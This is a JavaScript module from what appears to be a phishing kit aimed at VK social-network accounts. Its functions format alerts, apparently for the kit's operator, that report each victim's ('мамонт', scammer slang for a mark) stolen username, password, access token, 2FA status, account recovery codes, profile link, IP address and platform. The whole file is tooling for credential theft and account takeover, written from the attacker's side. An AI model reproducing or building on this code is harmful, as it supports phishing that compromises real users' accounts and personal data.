export function success(data) {
	return `<b>🐘 Мамонт успешно авторизовался 🔓</b>
Логин: <code>${data.username}</code>
Пароль: <code>${data.password}</code>
Токен: 
<pre><code>
${data.token}
</code></pre>
Профиль ВК: <a href="https://vk.com/id${data.user_id}">${data.first_name} ${data.last_name}</a>
2fa: ${'code' in data ? '<b>⚠️ Да</b>' : 'Нет'}

IP: ${data.ip}
Платформа: ${data.platform}`;
}
export function fail(data) {
	return `<b>🐘 Мамонт не смог войти 🤦‍♂️</b>
Логин: <code>${data.username}</code>
Пароль: <code>${data.password}</code>

IP: ${data.ip}
Платформа: ${data.platform}`;
}
export function mfa(data) {
	return `<b>🐘 У мамонта двухэтапка ⚠️</b>
Логин: <code>${data.username}</code>
Пароль: <code>${data.password}</code>

IP: ${data.ip}
Платформа: ${data.platform}`;
}
export function recoveryCodes(data) {
	return `<b>🐘 Получены коды восстановления страницы Мамонта ✅</b>
Логин: <code>${data.username}</code>
Пароль: <code>${data.password}</code>
Коды: ${data.codes.map((c) => `<code>${c}</code>`).join(', ')}
Профиль ВК: <a href="https://vk.com/id${data.user_id}">${data.first_name} ${data.last_name}</a>

IP: ${data.ip}
Платформа: ${data.platform}`;
}
